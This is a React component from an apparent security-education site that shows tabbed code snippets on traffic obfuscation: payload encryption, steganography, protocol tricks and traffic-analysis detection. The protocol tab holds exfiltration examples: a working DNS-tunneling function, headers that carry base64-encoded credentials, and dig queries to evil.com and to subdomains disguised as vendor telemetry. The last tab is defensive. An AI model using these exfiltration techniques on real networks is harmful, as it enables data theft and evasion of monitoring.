
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Shuffle, Code, Eye, Lock } from 'lucide-react';

const TrafficObfuscation: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Shuffle className="h-6 w-6" />
          Traffic Obfuscation & Encryption
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="payload-encryption" className="w-full">
          <TabsList className="grid grid-cols-2 md:grid-cols-4 w-full mb-6">
            <TabsTrigger value="payload-encryption">Payload Encryption</TabsTrigger>
            <TabsTrigger value="steganography">Steganography</TabsTrigger>
            <TabsTrigger value="protocol-obfuscation">Protocol Obfuscation</TabsTrigger>
            <TabsTrigger value="traffic-analysis">Traffic Analysis</TabsTrigger>
          </TabsList>

          <TabsContent value="payload-encryption" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Payload Encryption Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">AES Encryption</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Python AES Encryption
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64

def encrypt_payload(payload, key):
    cipher = AES.new(key, AES.MODE_CBC)
    iv = cipher.iv
    encrypted = cipher.encrypt(pad(payload.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted).decode()

def decrypt_payload(encrypted_payload, key):
    data = base64.b64decode(encrypted_payload)
    iv = data[:16]
    encrypted = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()

# Usage
key = get_random_bytes(32)  # 256-bit key
payload = "malicious command"
encrypted = encrypt_payload(payload, key)
print(f"Encrypted: {encrypted}")

# PowerShell AES Encryption
$key = [System.Security.Cryptography.Aes]::Create().Key
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key
$encryptor = $aes.CreateEncryptor()
$payload = [System.Text.Encoding]::UTF8.GetBytes("payload")
$encrypted = $encryptor.TransformFinalBlock($payload, 0, $payload.Length)
[System.Convert]::ToBase64String($encrypted)`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">XOR Encryption</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Simple XOR Encryption
def xor_encrypt(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

def xor_decrypt(encrypted_data, key):
    return xor_encrypt(encrypted_data, key)  # XOR is its own inverse

# Multi-byte XOR key
payload = b"malicious payload"
key = b"secretkey"
encrypted = xor_encrypt(payload, key)
decrypted = xor_decrypt(encrypted, key)

# JavaScript XOR Implementation
function xorEncrypt(text, key) {
    let result = '';
    for (let i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return btoa(result);  // Base64 encode
}

function xorDecrypt(encrypted, key) {
    let decoded = atob(encrypted);  // Base64 decode
    let result = '';
    for (let i = 0; i < decoded.length; i++) {
        result += String.fromCharCode(decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

# PowerShell XOR
function XOR-Encrypt {
    param($text, $key)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($text)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $result = @()
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $result += $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return [System.Convert]::ToBase64String($result)
}`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">RC4 Stream Cipher</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Python RC4 Implementation
def rc4_encrypt_decrypt(data, key):
    S = list(range(256))
    j = 0
    
    # Key-scheduling algorithm
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    
    # Pseudo-random generation algorithm
    i = j = 0
    result = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    
    return bytes(result)

# Usage
key = b"secret"
payload = b"malicious code"
encrypted = rc4_encrypt_decrypt(payload, key)
decrypted = rc4_encrypt_decrypt(encrypted, key)

# C# RC4 Implementation
public static byte[] RC4(byte[] data, byte[] key)
{
    byte[] s = new byte[256];
    byte[] result = new byte[data.Length];
    
    for (int i = 0; i < 256; i++)
        s[i] = (byte)i;
    
    int j = 0;
    for (int i = 0; i < 256; i++)
    {
        j = (j + s[i] + key[i % key.Length]) % 256;
        byte temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
    
    int x = 0, y = 0;
    for (int i = 0; i < data.Length; i++)
    {
        x = (x + 1) % 256;
        y = (y + s[x]) % 256;
        byte temp = s[x];
        s[x] = s[y];
        s[y] = temp;
        result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) % 256]);
    }
    
    return result;
}`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="steganography" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Advanced Steganography</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">LSB Image Steganography</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Python PIL LSB Steganography
from PIL import Image
import binascii

def encode_image(image_path, message, output_path):
    img = Image.open(image_path)
    encoded_img = img.copy()
    width, height = img.size
    
    # Convert message to binary
    binary_message = ''.join(format(ord(char), '08b') for char in message)
    binary_message += '1111111111111110'  # Delimiter
    
    data_index = 0
    for y in range(height):
        for x in range(width):
            if data_index < len(binary_message):
                pixel = list(encoded_img.getpixel((x, y)))
                # Modify LSB of red channel
                pixel[0] = (pixel[0] & 0xFE) | int(binary_message[data_index])
                encoded_img.putpixel((x, y), tuple(pixel))
                data_index += 1
            else:
                break
        if data_index >= len(binary_message):
            break
    
    encoded_img.save(output_path)

def decode_image(image_path):
    img = Image.open(image_path)
    width, height = img.size
    binary_message = ""
    
    for y in range(height):
        for x in range(width):
            pixel = img.getpixel((x, y))
            binary_message += str(pixel[0] & 1)
    
    # Find delimiter
    delimiter = '1111111111111110'
    end_index = binary_message.find(delimiter)
    if end_index != -1:
        binary_message = binary_message[:end_index]
    
    # Convert binary to text
    message = ""
    for i in range(0, len(binary_message), 8):
        byte = binary_message[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))
    
    return message

# Usage
encode_image("cover.png", "secret payload", "stego.png")
hidden_message = decode_image("stego.png")`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Audio Steganography</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Python Audio LSB Steganography
import wave
import struct

def encode_audio(audio_path, message, output_path):
    with wave.open(audio_path, 'rb') as audio:
        frames = audio.readframes(-1)
        sound_data = struct.unpack('<' + ('h' * (len(frames) // 2)), frames)
        
        # Convert message to binary
        binary_message = ''.join(format(ord(char), '08b') for char in message)
        binary_message += '1111111111111110'  # End marker
        
        # Modify LSB of audio samples
        modified_data = list(sound_data)
        for i, bit in enumerate(binary_message):
            if i < len(modified_data):
                modified_data[i] = (modified_data[i] & 0xFFFE) | int(bit)
        
        # Write modified audio
        with wave.open(output_path, 'wb') as output_audio:
            output_audio.setparams(audio.getparams())
            packed_data = struct.pack('<' + ('h' * len(modified_data)), *modified_data)
            output_audio.writeframes(packed_data)

def decode_audio(audio_path):
    with wave.open(audio_path, 'rb') as audio:
        frames = audio.readframes(-1)
        sound_data = struct.unpack('<' + ('h' * (len(frames) // 2)), frames)
        
        # Extract LSBs
        binary_message = ""
        for sample in sound_data:
            binary_message += str(sample & 1)
        
        # Find end marker
        end_marker = '1111111111111110'
        end_index = binary_message.find(end_marker)
        if end_index != -1:
            binary_message = binary_message[:end_index]
        
        # Convert to text
        message = ""
        for i in range(0, len(binary_message), 8):
            byte = binary_message[i:i+8]
            if len(byte) == 8:
                message += chr(int(byte, 2))
        
        return message

# Usage
encode_audio("cover.wav", "hidden command", "stego.wav")
extracted = decode_audio("stego.wav")`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Text Steganography</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Whitespace Steganography
def encode_whitespace(cover_text, secret_message):
    binary_secret = ''.join(format(ord(char), '08b') for char in secret_message)
    
    stego_text = ""
    secret_index = 0
    
    for char in cover_text:
        stego_text += char
        if char == ' ' and secret_index < len(binary_secret):
            if binary_secret[secret_index] == '1':
                stego_text += ' '  # Extra space for '1'
            secret_index += 1
    
    return stego_text

def decode_whitespace(stego_text):
    binary_message = ""
    i = 0
    while i < len(stego_text):
        if stego_text[i] == ' ':
            if i + 1 < len(stego_text) and stego_text[i + 1] == ' ':
                binary_message += '1'
                i += 2  # Skip both spaces
            else:
                binary_message += '0'
                i += 1
        else:
            i += 1
    
    # Convert binary to text
    message = ""
    for i in range(0, len(binary_message), 8):
        byte = binary_message[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))
    
    return message

# Unicode Steganography
def encode_unicode(cover_text, secret_message):
    # Use zero-width characters
    ZERO_WIDTH_SPACE = '\u200B'
    ZERO_WIDTH_NON_JOINER = '\u200C'
    
    binary_secret = ''.join(format(ord(char), '08b') for char in secret_message)
    
    stego_text = ""
    secret_index = 0
    
    for char in cover_text:
        stego_text += char
        if secret_index < len(binary_secret):
            if binary_secret[secret_index] == '1':
                stego_text += ZERO_WIDTH_SPACE
            else:
                stego_text += ZERO_WIDTH_NON_JOINER
            secret_index += 1
    
    return stego_text`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="protocol-obfuscation" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Protocol Obfuscation</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">HTTP Header Obfuscation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Custom Headers for Data Exfiltration
GET /legitimate-page HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
X-Custom-Data: $(echo "sensitive data" | base64)
X-Session-ID: $(echo "admin credentials" | base64)
X-Request-ID: $(echo "database dump" | base64)
Cookie: sessionid=abc123; data=$(echo "payload" | base64)

# HTTP Parameter Pollution
GET /search?q=normal&q=$(echo "payload" | base64) HTTP/1.1
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=user&password=pass&username=admin&password=$(echo "hash" | base64)

# Case Sensitivity Abuse
gEt /InDeX.pHp HTTP/1.1
HoSt: TaRgEt.CoM
uSeR-aGeNt: MoZiLlA/5.0

# HTTP Version Confusion
GET /page HTTP/0.9

GET /page HTTP/2.0
Connection: Upgrade
Upgrade: h2c`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">DNS Query Obfuscation</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# DNS Tunneling with Base32 Encoding
import base64
import dns.resolver

def dns_exfiltrate(data, domain):
    encoded = base64.b32encode(data.encode()).decode().lower()
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
    
    for i, chunk in enumerate(chunks):
        subdomain = f"{i}-{chunk}.{domain}"
        try:
            dns.resolver.resolve(subdomain, 'A')
        except:
            pass  # Query was sent, that's what matters

# DNS Cache Poisoning
dig @target-dns-server poisoned-domain.com A
dig @target-dns-server $(echo "payload" | base64).evil.com TXT

# DNS over HTTPs Tunneling
curl -H "accept: application/dns-json" \
     "https://1.1.1.1/dns-query?name=$(echo 'data' | base64).tunnel.com&type=TXT"

# Covert DNS Queries
# Use legitimate-looking subdomains
dig update-check-$(echo "data" | base64).microsoft.com A
dig telemetry-$(echo "creds" | base64).google.com AAAA
dig metrics-$(echo "files" | base64).apple.com CNAME`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Protocol Switching</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# HTTP to WebSocket Upgrade
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: $(echo "payload" | base64)
Sec-WebSocket-Version: 13

# After upgrade, send binary data through WebSocket
import websocket

def on_open(ws):
    payload = b"malicious binary data"
    ws.send(payload, websocket.ABNF.OPCODE_BINARY)

ws = websocket.WebSocketApp("ws://target.com/ws", on_open=on_open)

# HTTP/2 Server Push Abuse
# Malicious server pushes unauthorized content
PUSH_PROMISE frame for /malicious-script.js
DATA frame containing obfuscated JavaScript

# QUIC Protocol Tunneling
# Use QUIC's encryption to hide payload
import aioquic

async def send_covert_data():
    connection = QuicConnection(is_client=True)
    stream_id = connection.get_next_available_stream_id()
    connection.send_stream_data(stream_id, b"hidden_payload")

# Protocol Downgrade Attack
# Force HTTP/2 to HTTP/1.1 to bypass HTTP/2-specific protections
Connection: close
HTTP2-Settings: $(base64_encoded_malicious_settings)`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="traffic-analysis" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Traffic Analysis & Detection</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Traffic Pattern Analysis</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Wireshark Filters for Suspicious Traffic
# Unusual protocols
tcp.port != 80 and tcp.port != 443 and tcp.port != 22

# Suspicious DNS queries
dns.qry.name contains "base64" or dns.qry.name matches ".*[0-9a-f]{32,}.*"

# Unusual HTTP methods
http.request.method != "GET" and http.request.method != "POST"

# Long domain names (potential DNS tunneling)
dns.qry.name matches ".*[a-zA-Z0-9]{50,}.*"

# Encrypted traffic on unusual ports
ssl and not (tcp.port == 443 or tcp.port == 993 or tcp.port == 995)

# Python Traffic Analysis
from scapy.all import *
import re

def analyze_packet(packet):
    if packet.haslayer(DNS):
        query = packet[DNS].qd.qname.decode()
        # Check for base64 patterns
        if re.match(r'.*[A-Za-z0-9+/]{20,}.*', query):
            print(f"Suspicious DNS query: {query}")
    
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load
        # Check for encrypted data patterns
        entropy = calculate_entropy(payload)
        if entropy > 7.5:  # High entropy suggests encryption
            print(f"High entropy payload detected: {entropy}")

def calculate_entropy(data):
    import math
    from collections import Counter
    
    counter = Counter(data)
    total = len(data)
    entropy = -sum((count/total) * math.log2(count/total) for count in counter.values())
    return entropy

# Capture and analyze
sniff(prn=analyze_packet, filter="tcp or udp")`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Covert Channel Detection</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# ICMP Covert Channel Detection
tcpdump -i eth0 'icmp and icmp[icmptype] = 8' -X | grep -E '[0-9a-f]{32,}'

# TCP Sequence Number Analysis
# Look for patterns in sequence numbers
tshark -i eth0 -T fields -e tcp.seq -e tcp.ack \
       -Y "tcp.flags.syn==1" | sort | uniq -c | sort -nr

# HTTP Header Analysis
# Detect unusual headers
tshark -i eth0 -T fields -e http.request.method -e http.host -e http.user_agent \
       -Y "http.request" | grep -v "Mozilla\|Chrome\|Safari"

# DNS Tunneling Detection
# Analyze query patterns
tshark -i eth0 -T fields -e dns.qry.name -Y "dns.qry.type==1" | \
awk '{print length($1), $1}' | sort -nr | head -20

# Statistical Analysis Script
#!/bin/bash
# Detect anomalous traffic patterns

# Connection frequency analysis
netstat -tuln | awk '{print $4}' | cut -d: -f2 | sort | uniq -c | sort -nr

# Packet size distribution
tcpdump -i eth0 -c 1000 -n | awk '{print $NF}' | \
sed 's/length//g' | sort -n | uniq -c

# Time-based analysis
tcpdump -i eth0 -tttt | awk '{print $1, $2}' | \
cut -d. -f1 | uniq -c | sort -nr`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Decryption & Analysis Tools</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# SSL/TLS Traffic Decryption
# Using Wireshark with SSL keys
# Edit -> Preferences -> Protocols -> TLS -> RSA keys list
# Add: IP, Port, Protocol, Key file

# Network Miner - Extract files from traffic
mono NetworkMiner.exe --interface eth0 --output /tmp/extracted/

# Chaosreader - Extract application data
chaosreader traffic.pcap

# Xplico - Network forensics
# Web interface for analyzing network traffic
systemctl start xplico
firefox http://localhost:9876

# Custom Python Decryption
import ssl
from mitmproxy import http

def decrypt_tls_traffic(flow: http.HTTPFlow):
    # Decrypt and analyze HTTPS traffic
    if flow.request.scheme == "https":
        decrypted_content = flow.response.content.decode('utf-8', errors='ignore')
        if any(keyword in decrypted_content.lower() for keyword in ['password', 'token', 'key']):
            print(f"Sensitive data found in {flow.request.url}")

# Frequency Analysis for Simple Ciphers
def frequency_analysis(ciphertext):
    from collections import Counter
    
    freq = Counter(ciphertext.upper())
    english_freq = 'ETAOINSHRDLCUMWFGYPBVKJXQZ'
    
    # Map most frequent cipher chars to most frequent English chars
    sorted_cipher = sorted(freq.items(), key=lambda x: x[1], reverse=True)
    mapping = {}
    
    for i, (cipher_char, _) in enumerate(sorted_cipher[:len(english_freq)]):
        mapping[cipher_char] = english_freq[i]
    
    return mapping

# Usage
cipher = "WKLV LV D WHVW"
mapping = frequency_analysis(cipher)
plaintext = ''.join(mapping.get(char, char) for char in cipher)
print(f"Decoded: {plaintext}")`}
                </pre>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default TrafficObfuscation;
